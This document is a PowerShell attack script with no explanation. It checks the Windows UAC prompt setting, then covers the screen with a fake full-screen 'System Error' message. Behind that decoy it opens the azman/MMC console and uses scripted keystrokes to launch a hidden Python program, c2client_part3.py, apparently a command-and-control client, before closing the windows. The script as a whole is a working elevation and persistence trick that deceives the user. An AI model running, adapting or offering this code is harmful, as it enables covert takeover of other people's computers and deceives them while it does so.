$UACRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

$UACValue = Get-ItemProperty -Path $UACRegKeyPath -Name ConsentPromptBehaviorAdmin | Select-Object -ExpandProperty ConsentPromptBehaviorAdmin

switch ($UACValue) {
    0 { "0 - UAC is disabled (Never notify)." }
    1 { "1 - UAC enabled - Prompt for credentials on the secure desktop (Always notify)." }
    2 { "2 - UAC enabled - Prompt for consent on the secure desktop." }
    3 { "3 - UAC enabled - Prompt for consent for non-Windows binaries." }
    4 { "4 - UAC enabled - Automatically deny elevation requests." }
	5 { "5 - UAC enabled - Prompt for consent for non-Windows binaries." }
    Default { "Unknown UAC setting." }
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = [System.Drawing.Color]::Black
$form.TopMost = $true

$form.KeyPreview = $true

$form.Add_Paint({
    param($sender, $event)
    
    $graphics = $event.Graphics
    
    $text = "[ System Error 0x45DB450000... Please Wait... ]"
    
    $font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
    $brush = [System.Drawing.Brushes]::White

    $textSize = $graphics.MeasureString($text, $font)

    $x = ($form.ClientSize.Width - $textSize.Width) / 2
    $y = ($form.ClientSize.Height - $textSize.Height) / 2

    $graphics.DrawString($text, $font, $brush, $x, $y)
})

# Timer to close form after 10 seconds
$timer = New-Object System.Timers.Timer
$timer.Interval = 7000  # 7 seconds
$timer.AutoReset = $false
$timer.Add_Elapsed({
    $form.Invoke([Action] { $form.Close() })
})
$timer.Start()

$form.Show()

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@

Start-Process "cmd.exe" -ArgumentList "/C start azman.msc" -NoNewWindow

Start-Sleep -Seconds 2

$taskschd = Get-Process -Name "mmc" -ErrorAction SilentlyContinue

if ($taskschd) {
    
    $hwnd = $taskschd.MainWindowHandle
	
    [User32]::SetForegroundWindow($hwnd)
    
    # Wait a moment for the window to come to the front
    Start-Sleep -Seconds 2

    # Send keystrokes to azman/mmc
    [void][System.Windows.Forms.SendKeys]::SendWait("%")
	[void][System.Windows.Forms.SendKeys]::SendWait("{RIGHT}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
	Start-Sleep -Seconds 2
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
	Start-Sleep -Seconds 2
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait(" ")
	Start-Sleep -Seconds 1
	[void][System.Windows.Forms.SendKeys]::SendWait("powershell.exe -Command Start-Process py C:\users\public\c2client_part3.py -WindowStyle Hidden{ENTER}")
	Start-Sleep -Seconds 4
	[void][System.Windows.Forms.SendKeys]::SendWait("%{F4}")
	Start-Sleep -Seconds 1
	[void][System.Windows.Forms.SendKeys]::SendWait("%{F4}")
	Start-Sleep -Seconds 1
	[void][System.Windows.Forms.SendKeys]::SendWait("%{F4}")

	
} else {
    Write-Host "taskschd/mmc is not running."
}

     $form.Close()
